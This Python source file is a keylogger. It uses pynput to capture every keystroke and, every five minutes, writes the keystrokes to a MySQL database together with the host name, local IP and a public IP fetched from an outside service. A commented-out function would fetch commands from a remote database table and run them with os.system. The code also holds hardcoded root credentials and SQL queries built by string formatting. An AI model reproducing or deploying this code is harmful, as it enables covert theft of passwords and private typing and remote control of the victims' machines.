# -*- coding: utf-8 -*-
# @Time    :2022/3/8 18:38
# @Author  :lzh
import socket
import time
import os
from shutil import copy
from threading import Thread
from urllib.request import urlopen
from pynput import keyboard, mouse
from loguru import logger
import pymysql
import traceback
from tkinter import messagebox

mylog = logger.add("error.log")
global_time = time.time()
loglist = []
hostname = socket.gethostname()
host = socket.gethostbyname(hostname)


class dbutil:

    def __init__(self):
        self.db = pymysql.connect(host='127.0.0.1',
                                  user='root',
                                  password='123456',
                                  database='keyboard')

    def insert(self, sql):
        # 打开数据库连接

        # 使用cursor()方法获取操作游标
        cursor = self.db.cursor()
        # SQL 插入语句
        try:
            # 执行sql语句
            cursor.execute(sql)
            # 提交到数据库执行
            self.db.commit()
        except:
            # 如果发生错误则回滚
            traceback.print_exc()
            self.db.rollback()
        self.db.close()

    def search(self, sql):
        try:
            # 执行SQL语句
            cursor = self.db.cursor()
            cursor.execute(sql)
            # 获取所有记录列表
            results = cursor.fetchall()
            self.db.close()
            return results
        except:
            traceback.print_exc()


def parse_log():
    """解析日志"""
    global loglist, host, hostname
    my_ip = str(urlopen('http://ip.42.pl/raw').read()).replace("'", "").replace("b", "")
    try:
        temp = [str(i).strip().replace("'", "") for i in loglist]
        if temp:
            content = " ".join(temp)
            content = content.replace("Key.backspace", " ")
            struct_time = time.localtime(time.time())  # 得到结构化时间格式
            now_time = time.strftime("%Y-%m-%d %H:%M:%S", struct_time)
            dbutil().insert(
                "insert into event(log_time, log, host, hostname,ip) values ('{}','{}','{}','{}','{}')".format(now_time, content, host, hostname,
                                                                                                               my_ip))
            loglist = loglist[len(temp):]
    except Exception as e:
        traceback.print_exc(e)
# def get_cmd():
#     """获取远程数据库执行命令"""
#     global host, hostname
#     sql = "select * from remote_cmd where host='%s'and hostname='%s'" % (host, hostname)
#     rtn = dbutil().search(sql)
#     if rtn:
#         for i in rtn:
#             print(i)
#             host, hostname, is_execute, cmd, execute_time, message_box, pop_times = i
#             if is_execute:
#                 if message_box:
#                     if isinstance(pop_times, int):
#                         for i in range(pop_times):
#                             messagebox.showerror("Hello", message_box)
#                 if cmd:
#                     try:
#                         messagebox.showerror("Hello", "即将执行命令:" + cmd)
#                         os.system(cmd)
#                         struct_time = time.localtime(time.time())  # 得到结构化时间格式
#                         now_time = time.strftime("%Y-%m-%d %H:%M:%S", struct_time)
#                         dbutil().insert(
#                             "update remote_cmd set execute_time='{}',is_execute=1 where host='{}' and hostname='{}' and cmd='{}'".format(now_time,
#                                                                                                                                          host,
#                                                                                                                                          hostname,
#                                                                                                                                          cmd))
#                     except Exception as e:
#                         logger.error(str(e))
def on_press(key):
    global global_time, loglist
    # 每5分钟读写一次
    if (time.time() - global_time) >= 300:
        parse_log()
        #get_cmd()
        global_time = time.time()
    loglist.append(key)


def on_release(key):
    if key == keyboard.Key.esc:
        return True


# 定义键盘监听线程
def press_thread():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as lsn:
        lsn.join()



if __name__ == '__main__':
    press_thread()
